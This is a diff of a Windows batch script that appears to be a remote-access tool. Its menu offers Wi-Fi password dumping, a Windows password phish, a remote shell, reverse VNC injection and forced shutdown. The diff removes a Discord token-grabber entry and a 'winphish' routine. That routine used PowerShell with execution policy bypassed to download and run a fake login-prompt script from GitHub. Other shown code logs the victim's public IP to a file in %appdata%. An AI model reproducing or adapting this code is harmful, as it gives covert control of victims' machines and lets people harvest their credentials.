@@ -18,7 +18,6 @@ echo.
 echo     Password             Description        
 echo    ----------           -------------       
 echo   wifipass        Displays Wifi Passwords   
-echo   tokengrab       Discord Token Grabber     
 echo   winphish        Windows Password Phish    
 echo.
 echo     Control              Description        
@@ -26,14 +25,9 @@ echo    ---------            -------------
 echo   shell           Remote Shell              
 echo   vncinject       Injects Reverse Vnc       
 echo   msg             Sends MessageBox          
-echo   website         Visits Website            
 echo   shutdown        System Shutdown           
 echo.
 goto input
-)
-
-if /I "%input%" EQU "website" (
-goto website
 )
 
 if /I "%input%" EQU "shutdown" (
@@ -51,12 +45,6 @@ goto msg
 
 if /I "%input%" EQU "exit" (
 exit
-)
-
-if /I "%input%" EQU "winphish" (
-echo.
-echo Waiting for User Input...
-goto winphish
 )
 
 if /I "%input%" EQU "getinfo" (
@@ -222,14 +210,6 @@ goto input
 
 goto input
 
-:winphish
-chcp 437 >nul
-powershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1')); Invoke-LoginPrompt
-chcp 65001 >nul
-goto input
-
-goto input
-
 :getinfo
 curl -s ifconfig.me/ip>>%appdata%\Debug.txt
 :infowait
@@ -263,13 +243,5 @@ set /p msgicon=Icon (Information, Error, Warning):
 chcp 437 >nul
 powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%msgmsg%', '%msgtitle%', 'OK', [System.Windows.Forms.MessageBoxIcon]::%msgicon%);}"
 chcp 65001 >nul
-echo.
-goto input
-
-goto input
-
-:website
-set /p websiteurl=URL to Visit: 
-start %websiteurl%
 echo.
 goto input
